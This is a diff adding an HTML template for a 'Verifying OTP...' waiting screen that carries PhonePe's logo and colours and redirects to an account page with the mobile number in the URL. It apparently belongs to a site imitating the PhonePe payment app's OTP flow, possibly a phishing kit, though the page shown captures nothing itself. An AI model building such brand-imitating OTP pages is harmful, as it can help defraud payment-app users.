@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Verifying OTP...</title>
+  <meta http-equiv="refresh" content="3; url=/account?mobile={{ mobile }}">
+  <link rel="icon" href="/static/logo.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      background-color: #4a148c;
+      font-family: Arial;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .box {
+      background: white;
+      padding: 40px 30px;
+      border-radius: 12px;
+      text-align: center;
+      width: 90%;
+      max-width: 400px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
+    }
+
+    .spinner {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #4a148c;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin: 25px auto;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .note {
+      font-size: 14px;
+      margin-top: 20px;
+      color: #b71c1c;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <img src="/static/logo.png" alt="PhonePe Logo" style="width: 90px;">
+    <h3>Verifying OTP...</h3>
+    <div class="spinner"></div>
+    <p class="note"><b>Note:</b> PhonePe never asks for OTP over phone calls.</p>
+  </div>
+</body>
+</html>
